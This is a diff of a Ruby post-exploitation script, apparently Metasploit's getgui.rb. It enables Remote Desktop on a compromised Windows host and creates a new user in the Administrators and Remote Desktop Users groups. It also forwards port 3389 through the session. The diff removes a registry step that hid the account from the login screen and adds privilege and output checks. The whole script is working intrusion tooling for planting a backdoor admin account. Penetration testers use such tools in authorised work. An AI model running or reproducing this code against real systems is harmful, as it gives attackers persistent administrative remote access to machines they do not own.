@@ -1,5 +1,5 @@
-# $Id$
-# $Revision$
+# $Id: getgui.rb 14109 2011-10-29 00:21:16Z thelightcosine $
+# $Revision: 14109 $
 # Author: Carlos Perez at carlos_perez[at]darkoperator.com
 #-------------------------------------------------------------------------------
 ################## Variable Declarations ##################
@@ -67,7 +67,7 @@ def enabletssrv()
 			file_local_write(@dest,"execute -H -f cmd.exe -a \"/c sc config termservice start= disabled\"")
 			cmd_exec("sc start termservice")
 			file_local_write(@dest,"execute -H -f cmd.exe -a \"/c sc stop termservice\"")
-			
+
 		else
 			print_status "\tTerminal Services service is already set to auto"
 		end
@@ -83,7 +83,7 @@ end
 
 
 def addrdpusr(session, username, password)
-		
+
 	rdu = resolve_sid("S-1-5-32-555")[:name]
 	admin = resolve_sid("S-1-5-32-544")[:name]
 
@@ -91,18 +91,22 @@ def addrdpusr(session, username, password)
 	print_status "Setting user account for logon"
 	print_status "\tAdding User: #{username} with Password: #{password}"
 	begin
-		cmd_exec("net user #{username} #{password} /add")
-		file_local_write(@dest,"execute -H -f cmd.exe -a \"/c net user #{username} /delete\"")
-		print_status "\tHiding user from Windows Login screen"
-		hide_user_key = 'HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList'
-		registry_setvaldata(hide_user_key,username,0,"REG_DWORD")
-		file_local_write(@dest,"reg deleteval -k HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\ NT\\\\CurrentVersion\\\\Winlogon\\\\SpecialAccounts\\\\UserList -v #{username}")
-		print_status "\tAdding User: #{username} to local group '#{rdu}'"
-		cmd_exec("net localgroup \"#{rdu}\" #{username} /add")
-		
-		print_status "\tAdding User: #{username} to local group '#{admin}'"
-		cmd_exec("net localgroup #{admin}  #{username} /add")
-		print_status "You can now login with the created user"
+		addusr_out = cmd_exec("cmd.exe", "/c net user #{username} #{password} /add")
+		if addusr_out =~ /success/i
+			file_local_write(@dest,"execute -H -f cmd.exe -a \"/c net user #{username} /delete\"")
+			print_status "\tAdding User: #{username} to local group '#{rdu}'"
+			cmd_exec("cmd.exe","/c net localgroup \"#{rdu}\" #{username} /add")
+
+			print_status "\tAdding User: #{username} to local group '#{admin}'"
+			cmd_exec("cmd.exe","/c net localgroup #{admin}  #{username} /add")
+			print_status "You can now login with the created user"
+		else
+			print_error("Account could not be created")
+			print_error("Error:")
+			addusr_out.each_line do |l|
+				print_error("\t#{l.chomp}")
+			end
+		end
 	rescue::Exception => e
 		print_status("The following Error was encountered: #{e.class} #{e}")
 	end
@@ -143,13 +147,22 @@ if client.platform =~ /win32|win64/
 		if enbl or (usr and pass)
 			message
 			if enbl
-				enablerd()
-				enabletssrv()
+				if is_admin?
+					enablerd()
+					enabletssrv()
+				else
+					print_error("Insufficient privileges, Remote Desktop Service was not modified.")
+				end
 			end
+
 			if usr and pass
-				
-				addrdpusr(session, usr, pass)
+				if is_admin?
+					addrdpusr(session, usr, pass)
+				else
+					print_error("Insufficient privileges, account was not be created.")
+				end
 			end
+
 			if frwrd == true
 				print_status("Starting the port forwarding at local port #{lport}")
 				client.run_cmd("portfwd add -L 0.0.0.0 -l #{lport} -p 3389 -r 127.0.0.1")
